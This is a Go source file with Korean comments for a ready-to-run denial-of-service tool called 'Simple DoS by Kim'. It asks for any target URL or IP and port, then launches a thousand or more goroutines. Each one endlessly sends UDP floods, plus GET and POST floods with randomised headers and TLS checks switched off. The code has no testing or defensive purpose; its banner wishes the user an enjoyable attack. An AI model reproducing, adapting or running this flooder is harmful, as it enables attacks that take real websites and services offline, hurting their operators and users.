package main

import (
	"bytes"      // HTTP POST 요청 데이터 처리용
	"fmt"        // 출력용
	"log"        // 로깅용
	"math/rand"  // 랜덤 데이터 생성용
	"net"        // 네트워크 작업 (IP 확인, UDP)
	"net/http"   // HTTP 요청용
	"net/url"    // URL 파싱용
	"os"         // 파일 시스템, 환경 변수, 종료 등
	"os/exec"    // 화면 지우기 (clearScreen)
	"runtime"    // CPU 코어 수 확인 (자동 스레드 수 설정)
	"strconv"    // 문자열-정수 변환용
	"strings"    // 문자열 처리용
	"sync"       // 고루틴 동기화 (WaitGroup)
	"time"       // 시간 관련 (슬립, 타임아웃)
	"crypto/tls" // <-- 이 부분이 올바른 위치로 이동했습니다!

	"github.com/fatih/color" // 컬러 출력 라이브러리
)

// --- 전역 변수 설정 (파이썬 코드와 유사) ---
var fakeIPs = []string{
	"192.165.6.6", "192.176.76.7", "192.156.6.6", "192.155.5.5",
	"192.143.2.2", "188.142.41.4", "187.122.12.1", "192.153.4.4",
	"192.154.32.4", "192.153.53.25", "192.154.54.5", "192.143.43.4",
	"192.165.6.9", "188.154.54.3", "10.0.0.1", "172.16.0.1",
	"203.0.113.1", "198.51.100.1", "0.0.0.0",
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
	"Mozilla/5.0 (Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
}

var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"*/*",
}

var acceptEncodingHeaders = []string{
	"gzip, deflate",
	"gzip, deflate, br",
	"identity",
}

var acceptLanguageHeaders = []string{
	"en-US,en;q=0.9",
	"ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
	"en-GB,en;q=0.8",
	"fr-FR,fr;q=0.9",
}

var connectionHeaders = []string{
	"keep-alive",
	"close",
}

var cacheControlHeaders = []string{
	"no-cache",
	"max-age=0",
}

// 랜덤 시드 설정
var randSrc = rand.NewSource(time.Now().UnixNano())
var r = rand.New(randSrc)

// --- 유틸리티 함수 ---

// generateRandomString: 지정된 길이의 랜덤 문자열 생성
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[r.Intn(len(charset))]
	}
	return string(b)
}

// generateRandomQueryParams: 랜덤 쿼리 파라미터 생성
func generateRandomQueryParams() string {
	numParams := r.Intn(3) + 1 // 1 to 3 parameters
	params := url.Values{}
	for i := 0; i < numParams; i++ {
		key := generateRandomString(r.Intn(6) + 3)  // 3 to 8 chars
		value := generateRandomString(r.Intn(8) + 5) // 5 to 12 chars
		params.Add(key, value)
	}
	return params.Encode()
}

// clearScreen: 운영체제에 따라 화면 지우기
func clearScreen() {
	var cmd *exec.Cmd
	if os.Getenv("OS") == "Windows_NT" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else { // For Linux/macOS
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// isValidIPv4: IPv4 주소 유효성 검사
func isValidIPv4(ip string) bool {
	parsedIP := net.ParseIP(ip)
	return parsedIP != nil && parsedIP.To4() != nil
}

// init 함수는 main 함수보다 먼저 실행되어 로깅 및 컬러 설정을 초기화합니다.
func init() {
	// 로깅 설정
	log.SetOutput(os.Stdout)
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile) // 파일명, 라인 넘버 포함

	// 컬러 출력 강제 활성화 (colorama.init(autoreset=True)와 유사)
	color.NoColor = false
}

// 로고 정의
var logo = color.New(color.FgHiMagenta).SprintFunc()(
	`
╔══════════════════
║   Simple DoS by Kim
║   V : 3.1.8
║   MADE BY GNDFR
║   Enjoy your DoS attack :)
╚══════════════════
`,
)

// --- 공격 함수 ---

// floodTarget: Go의 고루틴으로 실행될 주 공격 로직
// goRtnID는 각 고루틴의 고유 ID (로깅 목적)
// wg는 WaitGroup으로, 고루틴 종료를 메인 함수에 알립니다.
func floodTarget(goRtnID int, targetIP string, targetPort int, effectiveBPS int, targetHostname string, wg *sync.WaitGroup) {
	defer wg.Done() // 고루틴 종료 시 WaitGroup에 알림

	// UDP 소켓 초기화
	var udpAddrStr string
	if strings.Contains(targetIP, ":") { // IPv6 주소인 경우
		udpAddrStr = fmt.Sprintf("[%s]:%d", targetIP, targetPort) // 대괄호로 감싸줍니다.
	} else { // IPv4 주소인 경우
		udpAddrStr = fmt.Sprintf("%s:%d", targetIP, targetPort)
	}
	udpAddr, err := net.ResolveUDPAddr("udp", udpAddrStr)
	
	if err != nil {
		log.Printf("[TID:%d] [UDP Init] Failed to resolve UDP address: %v", goRtnID, err)
		return
	}
	udpConn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		log.Printf("[TID:%d] [UDP Init] Failed to create UDP connection: %v", goRtnID, err)
		return
	}
	defer udpConn.Close() // 함수 종료 시 UDP 연결 닫기

	// HTTP 클라이언트 초기화
	// http.Client는 Go에서 커넥션 풀링을 자동으로 처리합니다.
	httpClient := &http.Client{
		Timeout: 5 * time.Second, // HTTP 요청 타임아웃 설정
		// 보안을 위해 실제 환경에서는 Verify SSL을 활성화해야 합니다.
		// 테스트 목적상 비활성화합니다.
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // requests.Session().get(..., verify=False)와 유사
		},
	}

	// 공격 루프
	for {
		// 1. UDP Flood (Increased Payload Size)
		// 1472 bytes는 이더넷 MTU에 맞는 조각화 없는 최대 UDP 페이로드 크기
		payload := make([]byte, 1472)
		r.Read(payload) // 랜덤 데이터로 페이로드 채우기

		// effectiveBPS를 기반으로 보낼 패킷 수 계산 (대략적인 BPS 유지)
		// Go에서는 초당 처리량을 직접 제어하기보다는, 가능한 한 빨리 보내는 것을 목표로 하고,
		// sleep으로 조절하거나, 동시성 레벨(고루틴 수)로 조절하는 것이 일반적입니다.
		// 여기서는 파이썬 코드의 로직을 따라갑니다.
		packetsToSend := effectiveBPS / 1472
		if packetsToSend == 0 {
			packetsToSend = 1 // 최소 1개는 보냄
		}

		for i := 0; i < packetsToSend; i++ {
			_, err := udpConn.Write(payload)
			if err != nil {
				log.Printf("[TID:%d] [UDP Flood] Send error to %s:%d: %v", goRtnID, targetIP, targetPort, err)
				time.Sleep(100 * time.Millisecond) // 에러 발생 시 잠시 대기 후 다음 시도
				break                              // 현재 패킷 배치 중단
			}
			log.Printf("[TID:%d] [UDP] Sent %d bytes to %s:%d (Packet %d/%d)", goRtnID, len(payload), targetIP, targetPort, i+1, packetsToSend)
		}

		// 2. HTTP GET/POST Flood (표준 net/http 라이브러리 사용)
		// 파이썬 코드의 requests GET과 HTTP GET/POST (raw socket)을 통합했습니다.
		randomPath := "/" + generateRandomString(r.Intn(11)+5) // 5 to 15 chars
		queryParams := generateRandomQueryParams()
		fullPath := randomPath
		if queryParams != "" {
			fullPath = fmt.Sprintf("%s?%s", randomPath, queryParams)
		}

		// 공통 헤더 생성
		baseHeaders := map[string]string{
			"User-Agent":      userAgents[r.Intn(len(userAgents))],
			"Accept":          acceptHeaders[r.Intn(len(acceptHeaders))],
			"Accept-Encoding": acceptEncodingHeaders[r.Intn(len(acceptEncodingHeaders))],
			"Accept-Language": acceptLanguageHeaders[r.Intn(len(acceptLanguageHeaders))],
			"Connection":      connectionHeaders[r.Intn(len(connectionHeaders))],
			"Cache-Control":   cacheControlHeaders[r.Intn(len(cacheControlHeaders))],
			"Pragma":          cacheControlHeaders[r.Intn(len(cacheControlHeaders))],
			"Referer":         fmt.Sprintf("http://%s/%s", fakeIPs[r.Intn(len(fakeIPs))], generateRandomString(r.Intn(11)+5)),
		}

		targetURLForRequests := fmt.Sprintf("http://%s:%d%s", targetHostname, targetPort, fullPath)
		if targetPort == 443 {
			targetURLForRequests = fmt.Sprintf("https://%s:%d%s", targetHostname, targetPort, fullPath)
		}

		// HTTP GET 요청
		req, err := http.NewRequest("GET", targetURLForRequests, nil)
		if err != nil {
			log.Printf("[TID:%d] [HTTP GET] Failed to create request: %v", goRtnID, err)
		} else {
			for k, v := range baseHeaders {
				req.Header.Add(k, v)
			}
			resp, err := httpClient.Do(req)
			if err != nil {
				log.Printf("[TID:%d] [HTTP GET] Error sending request to %s: %v", goRtnID, targetURLForRequests, err)
			} else {
				resp.Body.Close() // 응답 본문 반드시 닫기
				log.Printf("[TID:%d] [HTTP GET] Sent request to %s (Status: %s)", goRtnID, targetURLForRequests, resp.Status)
			}
		}

		// HTTP POST 요청
		postDataLen := r.Intn(3073) + 1024 // 1024 to 4096 bytes
		postData := make([]byte, postDataLen)
		r.Read(postData) // 랜덤 데이터로 채우기

		postURL := fmt.Sprintf("http://%s:%d/submit", targetHostname, targetPort)
		if targetPort == 443 {
			postURL = fmt.Sprintf("https://%s:%d/submit", targetHostname, targetPort)
		}

		req, err = http.NewRequest("POST", postURL, bytes.NewBuffer(postData))
		if err != nil {
			log.Printf("[TID:%d] [HTTP POST] Failed to create request: %v", goRtnID, err)
		} else {
			for k, v := range baseHeaders {
				req.Header.Add(k, v)
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded") // 파이썬 코드와 동일하게 설정
			req.Header.Set("Content-Length", strconv.Itoa(len(postData)))

			resp, err := httpClient.Do(req)
			if err != nil {
				log.Printf("[TID:%d] [HTTP POST] Error sending request to %s: %v", goRtnID, postURL, err)
			} else {
				resp.Body.Close() // 응답 본문 반드시 닫기
				log.Printf("[TID:%d] [HTTP POST] Sent %d bytes to %s (Status: %s)", goRtnID, len(postData), postURL, resp.Status)
			}
		}

		// 3. TCP SYN Flood (Scapy 부분)
		// 이 부분은 Go에서 Raw Socket을 직접 사용하여 IP 스푸핑을 구현해야 하며,
		// 이는 복잡하고 운영체제별 권한 (관리자/루트)이 필요합니다.
		// 일반적인 Go 애플리케이션에서는 이러한 저수준 패킷 조작을 직접 수행하는 경우가 드뭅니다.
		// 따라서 이 버전에서는 생략합니다.
		// 만약 이 기능이 정말 필요하다면, 'pnet' 또는 'gopacket' 라이브러리를
		// 깊이 있게 탐구해야 하며, CGO(C언어 연동) 설정 및 OS별 특성을 고려해야 합니다.

		// 랜덤 슬립 시간 (0.1ms ~ 1ms)
		sleepDuration := time.Duration(r.Intn(901)+100) * time.Microsecond // 100us ~ 1000us (0.1ms ~ 1ms)
		time.Sleep(sleepDuration)
	}
}

// --- 메인 함수 ---

func main() {
	clearScreen()
	fmt.Println(logo)

	var targetInput string
	fmt.Print(color.WhiteString("URL (e.g., www.example.com) or IP Target : "))
	fmt.Scanln(&targetInput)
	targetInput = strings.TrimSpace(targetInput)

	var targetIP string
	var targetHostname string

	if isValidIPv4(targetInput) {
		targetIP = targetInput
		targetHostname = targetInput // IP인 경우 호스트네임도 IP로 설정
		log.Printf("Target IP set to '%s'.", targetInput)
	} else {
		// URL 파싱을 위해 스키마가 없으면 http:// 추가
		if !strings.HasPrefix(targetInput, "http://") && !strings.HasPrefix(targetInput, "https://") {
			targetInput = "http://" + targetInput
		}
		parsedURL, err := url.Parse(targetInput)
		if err != nil || parsedURL.Hostname() == "" {
			fmt.Println(color.RedString("[!] Error: '%s' is an invalid URL or IP address format. [!]", targetInput))
			os.Exit(1)
		}

		targetHostname = parsedURL.Hostname()
		ips, err := net.LookupIP(targetHostname)
		if err != nil || len(ips) == 0 {
			fmt.Println(color.RedString("[!] Error: Could not resolve hostname for '%s'. Please check URL/domain name. [!]", targetHostname))
			os.Exit(1)
		}
		targetIP = ips[0].String() // 첫 번째 IP 사용
		log.Printf("'%s' resolved to IP '%s' with hostname '%s'.", targetInput, targetIP, targetHostname)
	}

	var targetPortStr string
	fmt.Print("Port (e.g., 80 for HTTP, 443 for HTTPS) : ")
	fmt.Scanln(&targetPortStr)
	targetPort, err := strconv.Atoi(targetPortStr)
	if err != nil || targetPort <= 0 || targetPort > 65535 {
		fmt.Println(color.RedString("[!] Invalid port input. Please enter a number between 1 and 65535. [!]"))
		os.Exit(1)
	}

	var bytesPerSecStr string
	fmt.Print("Bytes Per Sec (Enter 0 for auto) : ")
	fmt.Scanln(&bytesPerSecStr)
	bytesPerSec, err := strconv.Atoi(bytesPerSecStr)
	if err != nil || bytesPerSec < 0 {
		fmt.Println(color.RedString("[!] Invalid BPS input. Please enter a number. [!]"))
		os.Exit(1)
	}

	var threadCountStr string
	fmt.Print("Thread (Enter 0 for auto) : ")
	fmt.Scanln(&threadCountStr)
	threadCount, err := strconv.Atoi(threadCountStr)
	if err != nil || threadCount < 0 {
		fmt.Println(color.RedString("[!] Invalid thread input. Please enter a number. [!]"))
		os.Exit(1)
	}

	var useBoostInput string
	fmt.Print("Use Boost ? Y/N : ")
	fmt.Scanln(&useBoostInput)
	useBoost := strings.ToLower(strings.TrimSpace(useBoostInput)) == "y"

	// 자동 설정 로직 (파이썬 코드와 유사)
	if threadCount == 0 {
		cpuCount := runtime.NumCPU() // Go의 CPU 코어 수
		threadCount = cpuCount * 100
		if threadCount < 1000 {
			threadCount = 1000
		}
		log.Printf("Auto-setting thread count to %d.", threadCount)
	}

	if bytesPerSec == 0 {
		// 파이썬 로직을 Go에 맞게 조정 (대략적인 값)
		bytesPerSec = 1024 * 1024 // 최소 1MB/s
		if threadCount >= 100 { // 스레드 수에 비례하여 BPS 증가
			bytesPerSec = (threadCount / 100) * 10 * 1024 * 1024
		}
		log.Printf("Auto-setting Bytes Per Sec to %.2f MB/s.", float64(bytesPerSec)/(1024*1024))
	}

	effectiveBPS := bytesPerSec
	if useBoost {
		effectiveBPS += 500 // 파이썬과 동일하게 500 추가
	}

	clearScreen()
	fmt.Println(color.RedString("Attacking..."))
	fmt.Println(color.WhiteString("ATTACK STATUS: "))
	fmt.Println("╔═════════════════")
	fmt.Printf("║ Target: %s\n", targetInput)
	fmt.Printf("║ Resolved IP: %s\n", targetIP)
	fmt.Printf("║ Hostname: %s\n", targetHostname)
	fmt.Printf("║ Port    : %d\n", targetPort)
	fmt.Printf("║ BPS     : %d (Effective: %d)\n", bytesPerSec, effectiveBPS)
	fmt.Printf("║ Thrds   : %d\n", threadCount)
	fmt.Printf("║ Boost   : %s\n", strings.ToUpper(useBoostInput))
	fmt.Println("╚═════════════════")
	fmt.Println(color.YellowString("Attack launched. Check logs for status..."))

	// WaitGroup을 사용하여 모든 고루틴이 종료될 때까지 대기
	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1) // 고루틴 시작 전에 카운터 증가
		// 고루틴 실행
		go floodTarget(i+1, targetIP, targetPort, effectiveBPS, targetHostname, &wg)
	}

	// 모든 고루틴이 완료될 때까지 메인 고루틴은 대기
	// 이 경우 공격 고루틴은 무한 루프이므로, 사용자가 Ctrl+C로 종료해야 합니다.
	// wg.Wait() // Ctrl+C 처리를 위해 이 줄은 주석 처리합니다.

	// Ctrl+C (SIGINT)를 감지하여 프로그램 종료를 처리
	// 실제 운영 환경에서는 graceful shutdown 로직을 추가하는 것이 좋습니다.
	select {} // 고루틴이 무한 루프이므로 메인 고루틴이 종료되지 않도록 대기

	// 프로그램이 종료될 때까지 대기
	fmt.Println(color.WhiteString("\nExiting..."))
	time.Sleep(2 * time.Second)
	os.Exit(0)
}